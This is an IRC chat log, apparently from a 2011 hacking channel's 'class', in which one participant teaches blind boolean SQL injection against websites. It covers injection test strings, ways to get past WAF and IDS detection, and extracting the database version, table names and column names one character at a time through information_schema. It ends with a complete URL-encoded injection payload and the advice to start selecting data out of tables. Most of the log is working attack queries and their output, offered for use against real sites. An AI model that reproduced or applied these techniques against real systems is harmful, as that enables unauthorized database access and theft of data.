@@ -1,0 +1,386 @@
+SQL (by hatter)
+
+**** BEGIN LOGGING AT Sat Jun 25 13:07:46 2011
+
+Jun 25 13:07:46 <hatter>    class is now in session.
+Jun 25 13:07:49 <Mutiny>    LulzSheep I have 47,655 tracks on my computer ^^
+Jun 25 13:08:03 <Mutiny>    Which is about 20k more than I thought XD
+Jun 25 13:08:22 >Mutiny<    <hatter> class is now in session.
+Jun 25 13:08:22 *    [Mutiny] is away (Sleeping. Gtfo.)
+Jun 25 13:08:24 <Fox>    As per usual
+Jun 25 13:08:27 <Fox>    If you need voice
+Jun 25 13:08:27 <hatter>    For those of you who don’t already know, testing a site via a url is where you append injection strings
+Jun 25 13:08:31 <Fox>    ask an op other than the speaker
+Jun 25 13:08:34 <Fox>    if you have voice and say something stupid, or troll
+Jun 25 13:08:35 <Fox>    get fucked up.
+Jun 25 13:08:39 <hatter>    ^
+Jun 25 13:08:43 <Fox>    hatter, at your leisure.
+Jun 25 13:08:49 <hatter>    Thank you sir
+Jun 25 13:09:06 <hatter>    So, the /typical/ injection strings
+Jun 25 13:09:07 <hatter>    are
+Jun 25 13:09:17 <hatter>    ‘ and 1=1′ and ‘and 1=0′
+Jun 25 13:09:28 <hatter>    Followed by some sort of comment notation ( — ; /*)
+Jun 25 13:10:03 <hatter>    in a get parameter (e.g. domain.tld/vulnerable.ext?something=29847 and 1=1/*
+Jun 25 13:10:06 <hatter>    )
+Jun 25 13:10:30 <hatter>    Every once in a while, you may need to close parenthesis and put an extra ) before the comment or two
+Jun 25 13:10:52 <hatter>    an IDS will usually notice/a waf will block 1=1 and 1=0
+Jun 25 13:10:54 <hatter>    so some random number = itself
+Jun 25 13:11:01 <hatter>    and somerandomnumber = someotherrandomnumber
+Jun 25 13:11:05 <hatter>    is a better solution.
+Jun 25 13:11:37 <hatter>    When you’re testing, you’ll notice (if the site is vulnerable) that the and 1=1 output will be the same as the output without an injection string.
+Jun 25 13:12:14 <hatter>    sometimes you’ll want to actually put a quote (%27 urlencoded) before the space
+Jun 25 13:12:22 <hatter>    the space is also not always a space when testing or injecting
+Jun 25 13:12:46 <hatter>    It could be ‘ ‘ or it could be ‘+’
+Jun 25 13:13:19 <hatter>    When you give it the 1=0 injection
+Jun 25 13:13:24 <hatter>    you’ll notice a lot of data is missing on the page
+Jun 25 13:13:38 <hatter>    that 1=1 is the same as a “true” statement
+Jun 25 13:13:48 <hatter>    the 1=0 is the same as a “false” statement.
+Jun 25 13:14:04 <hatter>    You can identify true because it is always the same.  In other cases, you may need to identify by false.
+Jun 25 13:14:10 <hatter>    If true is not constant.
+Jun 25 13:14:21 <hatter>    (e.g. random image sliders and ads in the page)
+Jun 25 13:15:02 <hatter>    for false statements, the page is usually almost empty
+Jun 25 13:15:22 <hatter>    so we’ll start with version printing
+Jun 25 13:15:46 <hatter>    in this case, we’ll use a universal statement (this works on mysql and postgresql and in many cases mssql)
+Jun 25 13:15:56 <hatter>    My example will be a mysql server
+Jun 25 13:16:46 <hatter>    Now when you’re injecting into a parameter
+Jun 25 13:16:53 <hatter>    You /usually/ get where clause injection
+Jun 25 13:17:10 <hatter>    When testing true/false statements
+Jun 25 13:17:18 <hatter>    The smallest value you can check against is one byte of hex.
+Jun 25 13:17:48 <hatter>    mysql> select version();
+Jun 25 13:17:48 <hatter>    +————+
+Jun 25 13:17:48 <hatter>    | version()  |
+Jun 25 13:17:48 <hatter>    +————+
+Jun 25 13:17:48 <hatter>    | 5.1.52-log |
+Jun 25 13:17:48 <hatter>    +————+
+Jun 25 13:17:54 <hatter>    That’s a string.
+Jun 25 13:18:05 <hatter>    We have to start with the first letter in that string (represented by one byte).
+Jun 25 13:18:28 <hatter>    so we’ll select the ascii code (this way we can compare it to a numeric value)
+Jun 25 13:19:01 <hatter>    the substr() function is used to select a single character in the string.
+Jun 25 13:19:36 <hatter>    mysql> select substr((select version()),1,1)\g
+Jun 25 13:19:36 <hatter>    +——————————–+
+Jun 25 13:19:36 <hatter>    | substr((select version()),1,1) |
+Jun 25 13:19:36 <hatter>    +——————————–+
+Jun 25 13:19:36 <hatter>    | 5                              |
+Jun 25 13:19:36 <hatter>    +——————————–+
+Jun 25 13:19:36 <hatter>    1 row in set (0.01 sec)
+Jun 25 13:19:57 <hatter>    we use the ascii() function to get the ascii code.
+Jun 25 13:20:18 <hatter>    mysql> select ascii(substr((select version()),1,1))\g
+Jun 25 13:20:18 <hatter>    +—————————————+
+Jun 25 13:20:18 <hatter>    | ascii(substr((select version()),1,1)) |
+Jun 25 13:20:18 <hatter>    +—————————————+
+Jun 25 13:20:18 <hatter>    |                                    53 |
+Jun 25 13:20:18 <hatter>    +—————————————+
+Jun 25 13:21:01 <hatter>    Now, say the page was a simple demo site
+Jun 25 13:21:10 <hatter>    and the parameter was title
+Jun 25 13:21:22 <hatter>    mysql> select “demo title”;
+Jun 25 13:21:22 <hatter>    +————+
+Jun 25 13:21:22 <hatter>    | demo title |
+Jun 25 13:21:22 <hatter>    +————+
+Jun 25 13:21:22 <hatter>    | demo title |
+Jun 25 13:21:22 <hatter>    +————+
+Jun 25 13:21:57 <hatter>    sec.
+Jun 25 13:23:24 <hatter>    mysql> select title from title where id=1
+Jun 25 13:23:24 <hatter>        -> ;
+Jun 25 13:23:24 <hatter>    +————+
+Jun 25 13:23:24 <hatter>    | title      |
+Jun 25 13:23:24 <hatter>    +————+
+Jun 25 13:23:24 <hatter>    | demo title |
+Jun 25 13:23:24 <hatter>    +————+
+Jun 25 13:23:24 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:23:38 <hatter>    mysql> select title from title where id=1 and 1=1;
+Jun 25 13:23:38 <hatter>    +————+
+Jun 25 13:23:38 <hatter>    | title      |
+Jun 25 13:23:38 <hatter>    +————+
+Jun 25 13:23:38 <hatter>    | demo title |
+Jun 25 13:23:38 <hatter>    +————+
+Jun 25 13:23:38 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:23:42 <hatter>    mysql> select title from title where id=1 and 1=0;
+Jun 25 13:23:42 <hatter>    Empty set (0.00 sec)
+Jun 25 13:24:12 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) > 127);
+Jun 25 13:24:12 <hatter>    Empty set (0.00 sec)
+Jun 25 13:24:24 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) < 127);
+Jun 25 13:24:24 <hatter>    +————+
+Jun 25 13:24:24 <hatter>    | title      |
+Jun 25 13:24:24 <hatter>    +————+
+Jun 25 13:24:24 <hatter>    | demo title |
+Jun 25 13:24:24 <hatter>    +————+
+Jun 25 13:24:24 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:24:54 <hatter>    So that’s what the whole query /could/ look like
+Jun 25 13:25:10 <hatter>    The reason you start at 127, is because this is 1/2 the maximum value of one byte
+Jun 25 13:25:17 <hatter>    the maximum value of one byte is 255
+Jun 25 13:25:42 <hatter>    You can always google for an ascii chart (when doing this by hand) if you’d like to turn the data back into letters later 
+Jun 25 13:26:00 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) < 64);
+Jun 25 13:26:00 <hatter>    +————+
+Jun 25 13:26:00 <hatter>    | title      |
+Jun 25 13:26:00 <hatter>    +————+
+Jun 25 13:26:00 <hatter>    | demo title |
+Jun 25 13:26:00 <hatter>    +————+
+Jun 25 13:26:00 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:26:11 <hatter>    so now we know the ascii code is less than 64
+Jun 25 13:26:27 *    Savitri gives voice to d0ct0r
+Jun 25 13:26:29 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) < 32);
+Jun 25 13:26:29 <hatter>    Empty set (0.00 sec)
+Jun 25 13:26:36 <hatter>    Its not less than 32
+Jun 25 13:27:38 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) > 48);
+Jun 25 13:27:38 <hatter>    +————+
+Jun 25 13:27:38 <hatter>    | title      |
+Jun 25 13:27:38 <hatter>    +————+
+Jun 25 13:27:38 <hatter>    | demo title |
+Jun 25 13:27:38 <hatter>    +————+
+Jun 25 13:27:38 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:27:49 <hatter>    Its greater than 48.
+Jun 25 13:28:03 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) > 56);
+Jun 25 13:28:03 <hatter>    Empty set (0.00 sec)
+Jun 25 13:28:07 <hatter>    less than 56.
+Jun 25 13:28:14 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) > 52);
+Jun 25 13:28:14 <hatter>    +————+
+Jun 25 13:28:14 <hatter>    | title      |
+Jun 25 13:28:14 <hatter>    +————+
+Jun 25 13:28:14 <hatter>    | demo title |
+Jun 25 13:28:14 <hatter>    +————+
+Jun 25 13:28:14 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:28:19 <hatter>    Greater than 52
+Jun 25 13:28:38 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) <54);
+Jun 25 13:28:38 <hatter>    +————+
+Jun 25 13:28:38 <hatter>    | title      |
+Jun 25 13:28:38 <hatter>    +————+
+Jun 25 13:28:38 <hatter>    | demo title |
+Jun 25 13:28:38 <hatter>    +————+
+Jun 25 13:28:38 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:28:46 <hatter>    its greater than 54 and less than 56.
+Jun 25 13:29:03 <hatter>    er wait
+Jun 25 13:29:07 <hatter>    I misqueried one
+Jun 25 13:29:08 <hatter>    doh
+Jun 25 13:29:35 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) < 62);
+Jun 25 13:29:35 <hatter>    +————+
+Jun 25 13:29:35 <hatter>    | title      |
+Jun 25 13:29:35 <hatter>    +————+
+Jun 25 13:29:35 <hatter>    | demo title |
+Jun 25 13:29:35 <hatter>    +————+
+Jun 25 13:29:35 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:29:55 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) >58);
+Jun 25 13:29:55 <hatter>    Empty set (0.00 sec)
+Jun 25 13:31:02 <hatter>    mysql> select title from title where (select ascii(substr((select version()),1,1)) = 53);
+Jun 25 13:31:02 <hatter>    +————+
+Jun 25 13:31:02 <hatter>    | title      |
+Jun 25 13:31:02 <hatter>    +————+
+Jun 25 13:31:02 <hatter>    | demo title |
+Jun 25 13:31:02 <hatter>    +————+
+Jun 25 13:31:02 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:31:11 <hatter>    we got an equals.
+Jun 25 13:31:25 <hatter>    so now we know the ascii code of the first char is 53
+Jun 25 13:31:41 <hatter>    we can manipulate the > and < operators
+Jun 25 13:31:43 <hatter>    to find the value
+Jun 25 13:32:11 <hatter>    mysql> select version();
+Jun 25 13:32:11 <hatter>    +————+
+Jun 25 13:32:11 <hatter>    | version()  |
+Jun 25 13:32:11 <hatter>    +————+
+Jun 25 13:32:11 <hatter>    | 5.1.52-log |
+Jun 25 13:32:11 <hatter>    +————+
+Jun 25 13:32:19 <hatter>    mysql> select substr((select version()),2,1)\g
+Jun 25 13:32:19 <hatter>    +——————————–+
+Jun 25 13:32:19 <hatter>    | substr((select version()),2,1) |
+Jun 25 13:32:19 <hatter>    +——————————–+
+Jun 25 13:32:19 <hatter>    | .                              |
+Jun 25 13:32:19 <hatter>    +——————————–+
+Jun 25 13:32:19 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:32:28 <hatter>    So you increment that second parameter
+Jun 25 13:32:32 <hatter>    and get to the second character.
+Jun 25 13:33:19 <hatter>    This is how you can iterate through the string to find the value of the whole version
+Jun 25 13:33:20 <hatter>    so
+Jun 25 13:33:21 <hatter>    sometimes
+Jun 25 13:33:23 <hatter>    you hit the end
+Jun 25 13:33:27 <hatter>    How can you tell you’ve hit the end?
+Jun 25 13:33:43 <hatter>    mysql> select length((select version()));
+Jun 25 13:33:43 <hatter>    +—————————-+
+Jun 25 13:33:43 <hatter>    | length((select version())) |
+Jun 25 13:33:43 <hatter>    +—————————-+
+Jun 25 13:33:43 <hatter>    |                         10 |
+Jun 25 13:33:43 <hatter>    +—————————-+
+Jun 25 13:33:43 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:33:57 <hatter>    so now we know that 10 is the highest value
+Jun 25 13:34:09 <hatter>    of the second parameter to substr()
+Jun 25 13:34:21 <hatter>    Ok, so you have a version fingerprint.  What’s next?
+Jun 25 13:34:47 <hatter>    Obviously, you’re in a completely foreign database.
+Jun 25 13:35:28 <Fox>    Pardon me guys
+Jun 25 13:35:50 <Fox>    Do we have anyone here that knows someone from malaysia?
+Jun 25 13:36:07 <d0ct0r>    wabbit
+Jun 25 13:36:11 <d0ct0r>    and morrissey
+Jun 25 13:36:22 <d0ct0r>    why?
+Jun 25 13:36:35 <Fox>    Doctor PM me. We’re in need of someone to help with some documents.
+Jun 25 13:36:45 <Fox>    hatter Please continue and forgive the interruption
+Jun 25 13:36:52 <hatter>    all good
+Jun 25 13:36:57 <hatter>    so
+Jun 25 13:37:02 <hatter>    mysql> show tables;
+Jun 25 13:37:02 <hatter>    +—————-+
+Jun 25 13:37:02 <hatter>    | Tables_in_foob |
+Jun 25 13:37:02 <hatter>    +—————-+
+Jun 25 13:37:02 <hatter>    | articles       |
+Jun 25 13:37:02 <hatter>    | title          |
+Jun 25 13:37:02 <hatter>    +—————-+
+Jun 25 13:37:02 <hatter>    2 rows in set (0.00 sec)
+Jun 25 13:37:08 <hatter>    Obviously I can run that in mysql
+Jun 25 13:37:15 <hatter>    but not through a url.
+Jun 25 13:37:23 <hatter>    mysql> select table_name from information_schema.tables where table_schema=database();
+Jun 25 13:37:23 <hatter>    +————+
+Jun 25 13:37:23 <hatter>    | table_name |
+Jun 25 13:37:23 <hatter>    +————+
+Jun 25 13:37:23 <hatter>    | articles   |
+Jun 25 13:37:23 <hatter>    | title      |
+Jun 25 13:37:23 <hatter>    +————+
+Jun 25 13:37:36 <hatter>    ok
+Jun 25 13:37:48 <hatter>    that’s a valid query that can be used by an interpretor’s connector.
+Jun 25 13:38:02 <hatter>    the problem is, we have two rows, so:
+Jun 25 13:38:14 <hatter>    mysql> select count(table_name) from information_schema.tables where table_schema=database();
+Jun 25 13:38:14 <hatter>    +——————-+
+Jun 25 13:38:14 <hatter>    | count(table_name) |
+Jun 25 13:38:14 <hatter>    +——————-+
+Jun 25 13:38:14 <hatter>    |                 2 |
+Jun 25 13:38:14 <hatter>    +——————-+
+Jun 25 13:38:28 <hatter>    We’d want to enumerate that :
+Jun 25 13:39:31 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database() > 5);
+Jun 25 13:39:31 <hatter>    Empty set (0.00 sec)
+Jun 25 13:39:40 *    ChanServ gives channel operator status to Topiary
+Jun 25 13:39:40 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database() < 5);
+Jun 25 13:39:40 <hatter>    +————+
+Jun 25 13:39:40 <hatter>    | title      |
+Jun 25 13:39:40 <hatter>    +————+
+Jun 25 13:39:40 <hatter>    | demo title |
+Jun 25 13:39:40 <hatter>    +————+
+Jun 25 13:39:40 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:39:49 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database() < 3);
+Jun 25 13:39:49 <hatter>    +————+
+Jun 25 13:39:49 <hatter>    | title      |
+Jun 25 13:39:49 <hatter>    +————+
+Jun 25 13:39:49 <hatter>    | demo title |
+Jun 25 13:39:49 <hatter>    +————+
+Jun 25 13:39:49 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:40:43 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database()) < 5;
+Jun 25 13:40:49 <hatter>    (those were bad parens before)
+Jun 25 13:40:59 <hatter>    +————+
+Jun 25 13:40:59 <hatter>    | title      |
+Jun 25 13:40:59 <hatter>    +————+
+Jun 25 13:40:59 <hatter>    | demo title |
+Jun 25 13:40:59 <hatter>    +————+
+Jun 25 13:41:12 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database()) < 3;
+Jun 25 13:41:12 <hatter>    +————+
+Jun 25 13:41:12 <hatter>    | title      |
+Jun 25 13:41:12 <hatter>    +————+
+Jun 25 13:41:12 <hatter>    | demo title |
+Jun 25 13:41:12 <hatter>    +————+
+Jun 25 13:41:12 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:41:12 <hatter>    mysql> select title from title where (select count(table_name) from information_schema.tables where table_schema=database()) = 2;
+Jun 25 13:41:12 <hatter>    +————+
+Jun 25 13:41:12 <hatter>    | title      |
+Jun 25 13:41:12 <hatter>    +————+
+Jun 25 13:41:13 <hatter>    | demo title |
+Jun 25 13:41:14 <hatter>    +————+
+Jun 25 13:41:15 <hatter>    We have an equals now
+Jun 25 13:41:34 <hatter>    mysql> select table_name from information_schema.tables where table_schema=database() LIMIT 1,1;
+Jun 25 13:41:34 <hatter>    +————+
+Jun 25 13:41:34 <hatter>    | table_name |
+Jun 25 13:41:34 <hatter>    +————+
+Jun 25 13:41:34 <hatter>    | title      |
+Jun 25 13:41:34 <hatter>    +————+
+Jun 25 13:41:34 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:41:38 <hatter>    that’s the first one
+Jun 25 13:41:52 <hatter>    mysql> select table_name from information_schema.tables where table_schema=database() LIMIT 0,1;
+Jun 25 13:41:52 <hatter>    +————+
+Jun 25 13:41:52 <hatter>    | table_name |
+Jun 25 13:41:52 <hatter>    +————+
+Jun 25 13:41:52 <hatter>    | articles   |
+Jun 25 13:41:52 <hatter>    +————+
+Jun 25 13:41:54 <hatter>    rather that is
+Jun 25 13:42:10 <hatter>    the second parameter of limit is always 1
+Jun 25 13:42:19 <hatter>    now you can treat that table name the same way we treated the version:
+Jun 25 13:42:40 <hatter>    mysql> select ascii(substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1));
+Jun 25 13:42:40 <hatter>    +—————————————————————————————————————+
+Jun 25 13:42:40 <hatter>    | ascii(substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1)) |
+Jun 25 13:42:40 <hatter>    +—————————————————————————————————————+
+Jun 25 13:42:40 <hatter>    |                                                                                                            97 |
+Jun 25 13:42:40 <hatter>    +—————————————————————————————————————+
+Jun 25 13:42:40 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:42:51 <hatter>    mysql> select (substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1));
+Jun 25 13:42:51 <hatter>    +———————————————————————————————————-+
+Jun 25 13:42:51 <hatter>    | (substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),1,1)) |
+Jun 25 13:42:51 <hatter>    +———————————————————————————————————-+
+Jun 25 13:42:51 <hatter>    | a                                                                                                        |
+Jun 25 13:42:51 <hatter>    +———————————————————————————————————-+
+Jun 25 13:42:51 <hatter>    1 row in set (0.00 sec)
+Jun 25 13:43:02 <hatter>    mysql> select (substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),2,1));
+Jun 25 13:43:02 <hatter>    +———————————————————————————————————-+
+Jun 25 13:43:02 <hatter>    | (substr((select table_name from information_schema.tables where table_schema=database() LIMIT 0,1),2,1)) |
+Jun 25 13:43:02 <hatter>    +———————————————————————————————————-+
+Jun 25 13:43:02 <hatter>    | r                                                                                                        |
+Jun 25 13:43:02 <hatter>    +———————————————————————————————————-+
+Jun 25 13:43:13 <hatter>    to go to the next string
+Jun 25 13:43:17 <hatter>    increment the first parameter
+Jun 25 13:43:25 <hatter>    Now, say we’ve got all the table names
+Jun 25 13:43:29 <hatter>    but we want column names for the tables
+Jun 25 13:43:46 <Savitri>    (gotta say i love that class)
+Jun 25 13:44:13 <hatter>    mysql> select table_name from information_schema.tables where table_schema=database() LIMIT 0,1;
+Jun 25 13:44:13 <hatter>    +————+
+Jun 25 13:44:13 <hatter>    | table_name |
+Jun 25 13:44:13 <hatter>    +————+
+Jun 25 13:44:13 <hatter>    | articles   |
+Jun 25 13:44:13 <hatter>    +————+
+Jun 25 13:44:33 <hatter>    Notice we don’t need to know the table name
+Jun 25 13:44:36 <hatter>    to get the table name.
+Jun 25 13:45:08 <hatter>    mysql> select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1) and table_schema=database();
+Jun 25 13:45:08 <hatter>    +————-+
+Jun 25 13:45:08 <hatter>    | column_name |
+Jun 25 13:45:08 <hatter>    +————-+
+Jun 25 13:45:08 <hatter>    | id          |
+Jun 25 13:45:08 <hatter>    | title_id    |
+Jun 25 13:45:08 <hatter>    | body        |
+Jun 25 13:45:08 <hatter>    +————-+
+Jun 25 13:45:08 <hatter>    3 rows in set (0.00 sec)
+Jun 25 13:45:16 <hatter>    mysql> desc articles\g
+Jun 25 13:45:16 <hatter>    +———-+————-+——+—–+———+—————-+
+Jun 25 13:45:16 <hatter>    | Field    | Type        | Null | Key | Default | Extra          |
+Jun 25 13:45:16 <hatter>    +———-+————-+——+—–+———+—————-+
+Jun 25 13:45:16 <hatter>    | id       | int(11)     | NO   | PRI | NULL    | auto_increment |
+Jun 25 13:45:16 <hatter>    | title_id | varchar(32) | YES  |     | NULL    |                |
+Jun 25 13:45:16 <hatter>    | body     | varchar(64) | YES  |     | NULL    |                |
+Jun 25 13:45:16 <hatter>    +———-+————-+——+—–+———+—————-+
+Jun 25 13:45:16 <hatter>    3 rows in set (0.00 sec)
+Jun 25 13:45:22 <hatter>    Nowe we
+Jun 25 13:45:30 <hatter>    Now we can iterate through the column names
+Jun 25 13:45:32 <hatter>    for that table
+Jun 25 13:45:38 <hatter>    so just an example
+Jun 25 13:45:45 <hatter>    (Yes we’re getting into some pretty big queries)
+Jun 25 13:45:49 <hatter>    This is the first letter
+Jun 25 13:45:53 <hatter>    of the first column
+Jun 25 13:45:56 <hatter>    in the first table
+Jun 25 13:46:00 <hatter>    in the current database:
+Jun 25 13:46:56 <Savitri>    won’t the IDS frown upon such long queries?
+Jun 25 13:47:08 <hatter>    +——————————————————————————————————————————————————————————————————————–+
+Jun 25 13:47:08 <hatter>    | substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1) and table_schema=database() limit 0,1),1,1) |
+Jun 25 13:47:08 <hatter>    +——————————————————————————————————————————————————————————————————————–+
+Jun 25 13:47:08 <hatter>    | i                                                                                                                                                                                                                  |
+Jun 25 13:47:36 <hatter>    Savitri: sure, there’s options for that
+Jun 25 13:47:44 <hatter>    always use https when you can (a lot of ids’s can’t ssl mitm)
+Jun 25 13:47:52 <hatter>    chunked encoding and session splicing,
+Jun 25 13:48:27 <hatter>    you can use head requests in stead of get requests
+Jun 25 13:48:29 <hatter>    there’s a lot you can do
+Jun 25 13:48:34 <hatter>    to stay away from the ids
+Jun 25 13:48:44 <hatter>    But that’s not the topic of this class 
+Jun 25 13:48:54 *    Mofers_ is now known as Mofers
+Jun 25 13:49:04 <hatter>    mysql> select ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1) and table_schema=database() limit 0,1),1,1));
+Jun 25 13:49:08 <hatter>    +—————————————————————————————————————————————————————————————————————————+
+Jun 25 13:49:08 <hatter>    |                                                                                                                                                                                                                       105 |
+Jun 25 13:49:08 <hatter>    +—————————————————————————————————————————————————————————————————————————+
+Jun 25 13:49:30 <hatter>    now you’d just append it to the original query:
+Jun 25 13:50:04 <hatter>    mysql> select title from title where id=1 and ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1) and table_schema=database() limit 0,1),1,1)) > 127;
+Jun 25 13:50:10 <hatter>    Empty set (0.00 sec)
+Jun 25 13:50:17 <hatter>    We know its not greater than 127.
+Jun 25 13:50:31 <hatter>    the important part is everything after that ‘and’ there.
+Jun 25 13:51:23 <hatter>    so your url will eventually look like this:
+Jun 25 13:54:01 <hatter>    https://domain.tld/vulnerable.ext?id=95843+and+ascii%28substr%28%28select+column_name+from+information_schema.columns+where+table_name%3D%28select+table_name+from+information_schema.tables+where+table_schema%3Ddatabase%28%29+LIMIT+0%2C1%29+and+table_schema%3Ddatabase%28%29+limit+0%2C1%29%2C1%2C1%29%29+%3E+127
+Jun 25 13:54:47 <hatter>    or https://domain.tld/vulnerable.ext?id=95843 and ascii(substr((select column_name from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1) and table_schema=database() limit 0,1),1,1)) > 127
+Jun 25 13:54:57 <hatter>    but the above is the url encoded version of it
+Jun 25 13:55:08 <hatter>    Alright
+Jun 25 13:55:29 <hatter>    So now you can iterate through all the columns of all the tables and start selecting things out of tables.
+Jun 25 13:55:32 <hatter>    enjoy
+Jun 25 13:55:38 *    hatter sets mode -m #school4lulz
+
